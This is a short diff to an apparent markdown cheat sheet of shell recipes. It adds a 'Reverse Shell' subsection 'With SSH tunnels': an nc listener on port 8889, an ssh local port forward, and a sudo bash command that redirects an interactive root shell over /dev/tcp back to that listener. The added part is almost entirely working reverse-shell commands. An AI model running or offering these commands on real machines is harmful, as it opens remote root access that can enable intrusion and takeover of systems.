@@ -44,6 +44,18 @@ python -m pyftpdlib -w -u <uname> -P <pass>
 ```
 
 ## Reverse Shell
+### With SSH tunnels
+First, start listening on the server:
+```bash
+nc -l -k localhost 8889
+```
+Then on the target machine:
+```bash
+# Open SSH tunnel
+ssh -N -L 8889:localhost:8889 qa -f # local -> remote
+# Start shell
+sudo bash -c 'bash -i >& /dev/tcp/127.0.0.1/8889 0>&1'
+```
 ### Echo only
 ```bash
 # target terminal A
